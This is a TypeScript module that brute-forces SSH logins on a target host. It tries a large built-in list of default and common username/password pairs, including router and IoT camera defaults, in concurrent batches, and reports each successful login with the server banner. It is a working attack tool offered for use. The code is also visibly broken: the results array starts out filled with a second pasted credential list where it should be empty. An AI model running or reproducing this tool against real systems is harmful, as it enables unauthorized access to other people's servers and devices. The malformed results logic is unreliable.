import { Client, type ConnectConfig } from "ssh2";

export interface BruteResult {
  host:     string;
  port:     number;
  user:     string;
  password: string;
  banner:   string;
}

/* ── Top real-world SSH credential pairs (from HoneyPot/Shodan research) ── */
const CREDENTIAL_PAIRS: [string, string][] = [
  ["root","root"],["root","toor"],["root","admin"],["root","password"],
  ["root","123456"],["root","12345678"],["root","1234"],["root","test"],
  ["root","pass"],["root","qwerty"],["root","raspberry"],["root","calvin"],
  ["root","alpine"],["root","openelec"],["root","vizxv"],["root","xmhdipc"],
  ["root","jvbzd"],["root","anko"],["root","7ujMko0admin"],["root","7ujMko0vizxv"],
  ["root","GM8182"],["root","hi3518"],["root","klv123"],["root","klv1234"],
  ["root","dreambox"],["root","1001chin"],["root","Zte521"],["root","huigu309"],
  ["root",""],["root","opensesame"],["root","default"],["root","changeme"],
  ["root","nagios"],["root","ubnt"],["root","1234567890"],["root","ipc"],
  ["root","cat1029"],["root","ceadmin"],["root","ikwb"],["root","fidel123"],
  ["root","support"],["root","system"],["root","oracle"],["root","master"],
  ["root","letmein"],["root","login"],["root","monkey"],["root","abc123"],
  ["root","baseball"],["root","dragon"],["root","football"],["root","princess"],
  ["root","passw0rd"],["root","shadow"],["root","superman"],["root","qazwsx"],
  ["root","michael"],["root","mustang"],["root","000000"],["root","666666"],
  ["root","111111"],["root","555555"],["root","654321"],["root","!@#$%^&*"],
  ["admin","admin"],["admin","password"],["admin","1234"],["admin","12345"],
  ["admin","admin123"],["admin","admin1234"],["admin","administrator"],
  ["admin","admin@123"],["admin","Admin123"],["admin","Password1"],
  ["admin","p@ssw0rd"],["admin","admin@2024"],["admin","test123"],
  ["admin","123456"],["admin",""],["admin","root"],["admin","changeme"],
  ["admin","default"],["admin","support"],["admin","ubnt"],["admin","1111"],
  ["admin","888888"],["admin","abc123"],["admin","letmein"],["admin","qwerty"],
  ["administrator","administrator"],["administrator","admin"],["administrator","password"],
  ["administrator","1234"],["administrator",""],["administrator","Admin123"],
  ["user","user"],["user","password"],["user","1234"],["user","user123"],
  ["user",""],["user","root"],["user","admin"],["user","12345"],
  ["guest","guest"],["guest","password"],["guest",""],["guest","1234"],
  ["ubuntu","ubuntu"],["ubuntu","password"],["ubuntu","1234"],["ubuntu",""],
  ["debian","debian"],["debian","password"],["debian",""],["debian","1234"],
  ["pi","raspberry"],["pi","pi"],["pi","password"],["pi","1234"],
  ["oracle","oracle"],["oracle","password"],["oracle","1234"],["oracle","oracle123"],
  ["postgres","postgres"],["postgres","password"],["postgres","1234"],["postgres",""],
  ["mysql","mysql"],["mysql","password"],["mysql",""],["mysql","root"],
  ["nagios","nagios"],["nagios","password"],["zabbix","zabbix"],["zabbix","password"],
  ["support","support"],["support","password"],["support","1234"],["support",""],
  ["ftpuser","ftpuser"],["ftpuser","password"],["ftp","ftp"],["ftp",""],
  ["test","test"],["test","password"],["test","1234"],["test","test123"],
  ["deploy","deploy"],["deploy","password"],["deploy","1234"],
  ["vagrant","vagrant"],["vagrant","password"],
  ["ansible","ansible"],["ansible","password"],
  ["git","git"],["git","password"],["git",""],
  ["jenkins","jenkins"],["jenkins","password"],["jenkins","admin"],
  ["tomcat","tomcat"],["tomcat","password"],["tomcat","s3cret"],["tomcat","admin"],
  ["nginx","nginx"],["nginx","password"],["www","www"],["www","password"],
  ["ec2-user","ec2-user"],["centos","centos"],["fedora","fedora"],
  ["bitnami","bitnami"],["cyberoam","cyber"],["huawei","huawei123"],
];

function tryCredential(
  host:     string,
  port:     number,
  user:     string,
  pass:     string,
  timeoutMs = 6000,
): Promise<{ ok: boolean; banner: string }> {
  return new Promise((resolve) => {
    const conn = new Client();
    let banner  = "";
    let settled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;

    const done = (ok: boolean) => {
      if (settled) return;
      settled = true;
      if (timer) clearTimeout(timer);
      try { conn.end(); } catch { /**/ }
      resolve({ ok, banner });
    };

    timer = setTimeout(() => done(false), timeoutMs + 500);

    const cfg: ConnectConfig = {
      host,
      port,
      username: user,
      readyTimeout: timeoutMs,
      algorithms: {
        kex: [
          "curve25519-sha256","curve25519-sha256@libssh.org",
          "ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521",
          "diffie-hellman-group-exchange-sha256",
          "diffie-hellman-group14-sha256","diffie-hellman-group14-sha1",
          "diffie-hellman-group1-sha1",
        ],
        serverHostKey: [
          "ssh-ed25519","ecdsa-sha2-nistp256","ecdsa-sha2-nistp384",
          "ecdsa-sha2-nistp521","rsa-sha2-512","rsa-sha2-256","ssh-rsa","ssh-dss",
        ],
      },
    };

    if (pass === "") {
      cfg.password = "";
    } else {
      cfg.password = pass;
    }

    conn.on("banner", (msg: string) => { banner = msg.trim().slice(0, 200); });
    conn.on("ready",  () => done(true));
    conn.on("error",  () => done(false));
    conn.connect(cfg);
  });
}

export interface BruteOptions {
  host:        string;
  port:        number;
  concurrency: number;
  timeoutMs:   number;
  stopOnFirst: boolean;
  onProgress:  (tried: number, total: number, found: BruteResult[]) => void;
  onFound:     (result: BruteResult) => void;
}

export async function sshBruteForce(opts: BruteOptions): Promise<BruteResult[]> {
  const {
    host, port, concurrency = 5, timeoutMs = 6000,
    stopOnFirst = false, onProgress, onFound,
  } = opts;

  const creds  = CREDENTIAL_PAIRS;
  const total  = creds.length;
  const found: BruteResult[] = [  ["ec2-user",""],["centos",""],["fedora",""],["bitnami",""],["ubuntu","ubuntu1"],["pi","1234"],
  ["root","system"],["root","server"],["root","service"],["root","netopia"],["root","xc3511"],
  ["root","phablet"],["root","hi3518"],["root","haier123"],["root","5up"],["root","1q2w3e"],
  ["root","xmhdipc"],["root","vizxv"],["root","7ujMko0admin"],["root","GM8182"],["root","klv123"],
  ["root","klv1234"],["root","fidel123"],["root","hunt5759"],["root","cat1029"],
  ["cisco","cisco"],["cisco",""],["enable","enable"],["admin","Cisco123"],["admin","cisco"],
  ["admin","huawei"],["admin","Admin@123"],["admin","Huawei@123"],["root","huigu309"],
  ["admin","H3C"],["admin","h3cadmin"],["superuser","superuser"],["supervisor","supervisor"],
  ["user","user1234"],["guest","12345"],["guest","admin"],
  ["sa","sa"],["sa",""],["sa","password"],["mssql","mssql"],["mssql","password"],
  ["mongodb","mongodb"],["redis","redis"],["redis",""],["elasticsearch","elasticsearch"],
  ["elastic","elastic"],["elastic","changeme"],["kibana","kibana"],["logstash","logstash"],
  ["cassandra","cassandra"],["neo4j","neo4j"],["neo4j","neo4j123"],["influxdb","influxdb"],
  ["gitlab","gitlab"],["gitlab","password"],["drone","drone"],["harbor","Harbor12345"],
  ["sonar","sonar"],["nexus","nexus123"],["rancher","rancher"],["portainer","portainer"],
  ["ubuntu","changeit"],["debian","changeit"],["rocky","rocky"],["alma","almalinux"],
  ["root","Summer2024!"],["admin","Summer2024!"],["root","Winter2024!"],["root","Welcome1!"],
  ["admin","Welcome1!"],["admin","Admin@2024"],["root","Root@2024"],["admin","P@ssword123"],
  ["root","Passw0rd!"],["root","Server@123"],["admin","Server@123"],["root","Linux@123"],
  ["root","r00t"],["root","t00r"],["root","pass1234"],["root","1qaz2wsx"],["root","zxcvbnm"],
  ["admin","Adm1n"],["admin","@dmin"],["admin","4dm1n"],["root","admin123456"],

];
  let tried    = 0;
  let stopped  = false;

  // Process in sliding-window batches of `concurrency`
  let idx = 0;
  while (idx < creds.length && !stopped) {
    const batch = creds.slice(idx, idx + concurrency);
    idx += concurrency;

    await Promise.all(batch.map(async ([user, pass]) => {
      if (stopped) return;
      const r = await tryCredential(host, port, user!, pass!, timeoutMs);
      tried++;
      if (r.ok) {
        const hit: BruteResult = { host, port, user: user!, password: pass!, banner: r.banner };
        found.push(hit);
        onFound(hit);
        if (stopOnFirst) stopped = true;
      }
      onProgress(tried, total, found);
    }));
  }

  return found;
}

export const SSH_CRED_TOTAL = CREDENTIAL_PAIRS.length;
